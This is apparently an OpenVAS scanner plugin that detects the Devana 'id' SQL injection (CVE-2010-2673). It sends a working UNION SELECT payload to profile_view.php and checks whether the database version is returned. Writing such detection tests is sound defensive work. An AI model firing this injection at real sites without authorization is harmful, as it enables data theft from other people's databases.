###############################################################################
# OpenVAS Vulnerability Test
#
# Devana 'id' SQL Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801229");
  script_version("2022-02-18T13:05:59+0000");
  script_tag(name:"last_modification", value:"2022-02-18 13:05:59 +0000 (Fri, 18 Feb 2022)");
  script_tag(name:"creation_date", value:"2010-07-16 19:44:55 +0200 (Fri, 16 Jul 2010)");
  script_cve_id("CVE-2010-2673");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Devana 'id' SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/39121");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/11922");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1003-exploits/devana-sql.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause SQL Injection
  attack and gain sensitive information.");

  script_tag(name:"affected", value:"Devana Version 1.6.6 and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  via the 'id' parameter in 'profile_view.php' which allows attacker to manipulate
  SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"Upgrade to Devena-v2_beta-1 or later.");

  script_tag(name:"summary", value:"Devana is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://sourceforge.net/projects/devana");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if (!http_can_host_php(port:port)) exit(0);

foreach dir(make_list_unique("/devana", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: string (dir,"/index.php"), port:port);

  if('<title>Devana - mmo browser strategy game - home</title>' >< res)
  {
    url = dir + "/profile_view.php?id=1+AND+1=2+UNION+SELECT+1,2," +
         "concat(version()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--";
    if(http_vuln_check(port:port, url:url, pattern:'>(([0-9.]+)([a-z0-9.]+)?)<'))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
